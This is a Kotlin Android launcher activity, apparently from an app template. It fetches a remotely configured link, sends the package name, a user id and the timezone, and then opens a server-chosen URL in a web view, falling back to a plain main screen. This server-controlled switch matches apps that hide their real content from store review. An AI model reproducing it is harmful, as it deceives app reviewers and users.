package com.template

import android.app.Activity
import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.NetworkOnMainThreadException
import android.util.Log
import android.widget.Toast
import com.google.android.gms.common.api.Response
import com.google.firebase.FirebaseApp
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.google.gson.*
import com.onesignal.OneSignal
import java.net.URL
import java.util.*
import android.os.StrictMode
import android.os.StrictMode.ThreadPolicy
import okhttp3.OkHttpClient
import org.apache.http.client.HttpClient
import org.apache.http.client.methods.HttpGet
import org.apache.http.client.methods.HttpPost
import org.apache.http.params.CoreProtocolPNames
import org.chromium.net.impl.UserAgent
import org.chromium.base.FileUtils.readStream
import retrofit2.HttpException
import retrofit2.http.Url
import java.io.BufferedInputStream
import java.io.InputStream
import java.lang.RuntimeException
import java.lang.reflect.InvocationTargetException
import java.net.HttpURLConnection
import java.net.URLConnection


class MyInitialActivity : AppCompatActivity() {
    lateinit var remoteConfig: FirebaseRemoteConfig
    private lateinit var firebaseAnalytics: FirebaseAnalytics

    val gson = Gson()

    override fun onCreate(savedInstanceState: Bundle?) {
        FirebaseApp.initializeApp(this)
        firebaseAnalytics = Firebase.analytics

        saveSharedPref(Utils.ID.toString(), Utils.PUTSP)

        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_my_initial)

        val policy = ThreadPolicy.Builder().permitAll().build()
        StrictMode.setThreadPolicy(policy)

        initOneSignal()

        remoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }
        remoteConfig.setConfigSettingsAsync(configSettings)

        webActivity(Utils.KEYFORJSON)
        mainActivity(Utils.KEY)

        getData()

    }

    private fun getData() {
        if(loadSharedPref(Utils.KEY) == "11" && loadSharedPref(Utils.KEYFORJSON) == "11") {
            remoteConfig.fetchAndActivate().addOnCompleteListener(this) {
                if (it.isSuccessful) {
                    Log.i(Utils.TAG, "isComplete")
                } else {
                    Log.i(Utils.TAG, "Fetch failed")
                }
                showText()
            }
        }
    }

    private fun showText() {
        val Str = remoteConfig.getString("check_link")
        if (Str.isNotEmpty()) {
            Log.i(Utils.TAG, Str)
            makeUpURL(Str)
        } else {
            Log.i(Utils.TAG, "check_link is empty")
        }
    }

    private fun setActivity(activity: Activity) {
        val intent = Intent(this, activity::class.java)
        startActivity(intent)
    }

    fun saveSharedPref(id: String, key: String) {
        val sharedPreferences = getSharedPreferences("sharedPref", Context.MODE_PRIVATE)
        val editor = sharedPreferences.edit()
        editor.apply {
            putString(key, id)
        }.apply()
    }

    fun loadSharedPref(key: String): String {
        val sharedPreferences = getSharedPreferences("sharedPref", Context.MODE_PRIVATE)
        val UUID = sharedPreferences.getString(key, "11")
        return UUID.toString()
    }

    private fun makeUpURL(url: String) {
        if(loadSharedPref(Utils.KEY) == "11" && loadSharedPref(Utils.KEYFORJSON) == "11")
            try {
                val link = URL(
                    "$url?packageid=$packageName&usserid=${loadSharedPref(Utils.PUTSP)}" +
                            "&getz=${Utils.timeZone}&getr=utm_source=google-play&utm_medium=organic"
                )
                Log.i(Utils.TAG, link.toString())
                urlConnection(link)
                val jsonAnswer = gson.fromJson(link.readText(), JsonAnswer::class.java)
                saveSharedPref(jsonAnswer.url, Utils.KEYFORJSON)
                OneSignal.sendTag("PRIMER_UR", jsonAnswer.url)
                Log.i(Utils.TAG, "jsonAnswer.url")
                Log.i(Utils.TAG, jsonAnswer.url)
                startActivityWithExtra(jsonAnswer.url)

            } catch (e: HttpException) {
                Log.i("str", e.message.toString())
                saveSharedPref("main", Utils.KEY)
            } catch (e: Throwable) {
                Log.i("str", e.message.toString())
                saveSharedPref("main", Utils.KEY)
                setActivity(MainActivity())
            }
    }

    private fun initOneSignal() {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(this)
        OneSignal.setAppId(Utils.ONE_SIGNAL_APP_ID)
    }

    private fun startActivityWithExtra(value: String) {
        val intent = Intent(this, WebActivity::class.java).apply {
            putExtra("url", value)
        }
        startActivity(intent)
    }

    private fun urlConnection(url: URL) {
        Log.i(Utils.TAG, url.toString())
        val urlConnection: HttpURLConnection = url.openConnection() as HttpURLConnection
        urlConnection.setRequestProperty(
            "User-Agent",
            System.getProperty("http.agent")
        )
    }

    private fun webActivity(key: String) {
        val string = loadSharedPref(key)
        if (string.isNotEmpty() && string != "11") {
            Log.i(Utils.TAG, string)
            startActivityWithExtra(string)
        }
    }

    private fun mainActivity(key: String) {
        val string = loadSharedPref(key)
        if (string.isNotEmpty() && string != "11") {
            Log.i(Utils.TAG, "mainActivity method")
            setActivity(MainActivity())
        }
    }
}
